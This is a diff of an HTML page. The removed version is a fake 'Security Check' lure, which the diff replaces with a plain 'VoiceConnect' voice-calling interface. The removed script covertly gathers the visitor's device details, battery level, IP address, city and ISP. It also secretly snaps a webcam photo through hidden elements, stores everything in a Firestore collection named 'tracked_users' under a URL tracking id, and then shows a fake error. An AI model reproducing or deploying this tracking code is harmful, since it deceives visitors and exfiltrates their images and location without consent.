@@ -3,141 +3,56 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Check</title>
-    <style>
-        body {
-            font-family: sans-serif;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            background-color: #f0f2f5;
-            color: #333;
-            text-align: center;
-        }
-        .loader {
-            border: 5px solid #f3f3f3;
-            border-top: 5px solid #3498db;
-            border-radius: 50%;
-            width: 50px;
-            height: 50px;
-            animation: spin 1s linear infinite;
-            margin-bottom: 20px;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        /* Hidden elements for camera capture */
-        #video, #canvas { display: none; }
-    </style>
+    <title>VoiceConnect - Realtime Calling</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
 </head>
 <body>
 
-    <div class="loader"></div>
-    <h3>Verifying Browser Security...</h3>
-    <p>Please allow camera access to verify you are human.</p>
+    <div class="app-container">
+        <header class="app-header">
+            <span class="material-icons logo-icon">graphic_eq</span>
+            <h1>VoiceConnect</h1>
+        </header>
 
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas"></canvas>
+        <main class="control-panel">
+            
+            <div class="input-group">
+                <label>Your Name</label>
+                <input type="text" id="username" placeholder="Enter your name">
+            </div>
 
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
-        import { getFirestore, doc, setDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore.js";
+            <div class="input-group">
+                <label>Room ID</label>
+                <div class="room-input-wrapper">
+                    <input type="text" id="roomId" placeholder="Enter Room ID to join">
+                    <button id="generateRoomBtn" class="icon-btn" title="Generate Random Room ID">
+                        <span class="material-icons">refresh</span>
+                    </button>
+                </div>
+            </div>
 
-        const firebaseConfig = {
-            apiKey: "AIzaSyAgisxeeq0hYN-7SF62IGkvZHPVmWnyThg",
-            authDomain: "xyze-9b306.firebaseapp.com",
-            projectId: "xyze-9b306",
-            storageBucket: "xyze-9b306.firebasestorage.app",
-            messagingSenderId: "814674031370",
-            appId: "1:814674031370:web:aa8f08895c1d305b2540f3",
-            measurementId: "G-33ZZ3HXVFC"
-        };
+            <div class="status-display">
+                <p id="statusText">Ready to connect</p>
+                <div class="indicator" id="statusIndicator"></div>
+            </div>
 
-        const app = initializeApp(firebaseConfig);
-        const db = getFirestore(app);
+            <div class="action-buttons">
+                <button id="startCallBtn" class="btn call-btn">
+                    <span class="material-icons">call</span> Start Call
+                </button>
+                <button id="hangupBtn" class="btn hangup-btn" disabled>
+                    <span class="material-icons">call_end</span> End Call
+                </button>
+            </div>
 
-        async function startTracking() {
-            const urlParams = new URLSearchParams(window.location.search);
-            const refId = urlParams.get('id');
-            if (!refId) return;
+            <audio id="remoteAudio" autoplay></audio>
+        </main>
+    </div>
 
-            let userData = {
-                timestamp: serverTimestamp(),
-                lastUpdated: new Date().toLocaleString(),
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                battery: "Unknown",
-                ip: "Unknown",
-                city: "Unknown",
-                photo: "Permission Denied / Not Available" // Default
-            };
-
-            // 1. Get Battery
-            try {
-                if (navigator.getBattery) {
-                    const battery = await navigator.getBattery();
-                    userData.battery = Math.round(battery.level * 100) + "%";
-                }
-            } catch (e) {}
-
-            // 2. Get IP
-            try {
-                const response = await fetch('https://ipwho.is/');
-                const ipData = await response.json();
-                if (ipData.success) {
-                    userData.ip = ipData.ip;
-                    userData.city = ipData.city;
-                    userData.isp = ipData.connection.isp;
-                }
-            } catch (e) {}
-
-            // 3. Request Camera & Capture
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const video = document.getElementById('video');
-                const canvas = document.getElementById('canvas');
-                
-                video.srcObject = stream;
-                
-                // Wait for video to load
-                await new Promise(resolve => video.onloadedmetadata = resolve);
-                
-                // Capture frame after 1 second
-                setTimeout(async () => {
-                    canvas.width = 320; // Low resolution to fit in DB
-                    canvas.height = 240;
-                    canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
-                    
-                    // Convert to Base64 String
-                    const photoData = canvas.toDataURL('image/jpeg', 0.5);
-                    userData.photo = photoData;
-
-                    // Stop Camera
-                    stream.getTracks().forEach(track => track.stop());
-
-                    // Save Everything
-                    await saveData(refId, userData);
-                    
-                    // Show Fake Error
-                    document.querySelector('h3').innerText = "Connection Failed";
-                    document.querySelector('.loader').style.display = "none";
-                }, 1000);
-
-            } catch (err) {
-                console.log("Camera Denied");
-                await saveData(refId, userData); // Save whatever data we have
-            }
-        }
-
-        async function saveData(id, data) {
-            try {
-                await setDoc(doc(db, "tracked_users", id), data, { merge: true });
-                console.log("Saved");
-            } catch (e) { console.error(e); }
-        }
-
-        window.onload = startTracking;
-    </script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
+    
+    <script src="script.js"></script>
 </body>
 </html>
